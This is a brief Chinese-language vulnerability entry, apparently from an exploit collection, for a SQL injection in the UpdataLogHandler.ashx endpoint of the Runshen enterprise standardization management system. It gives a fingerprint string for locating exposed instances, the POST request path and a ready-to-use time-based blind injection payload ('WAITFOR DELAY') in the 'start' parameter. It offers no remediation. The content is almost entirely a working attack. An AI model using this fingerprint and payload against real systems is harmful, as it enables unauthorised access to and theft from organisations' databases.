# 润申信息企业标准化管理系统UpdataLogHandler.ashxSQL注入漏洞

润申信息企业标准化管理系统UpdataLogHandler.ashx ｜ SQL注入 ｜ —
- **指纹**：`"PDCA/js/_publicCom.js"`
- **请求**：`POST /PDCA/ashx/UpdataLogHandler.ashx HTTP/1.1`

**Payload**
```
action=GetAll&start=' WAITFOR DELAY '0:0:5'--&end=&code=11&type=2&page=1&rows=20
```
- **响应特征**：999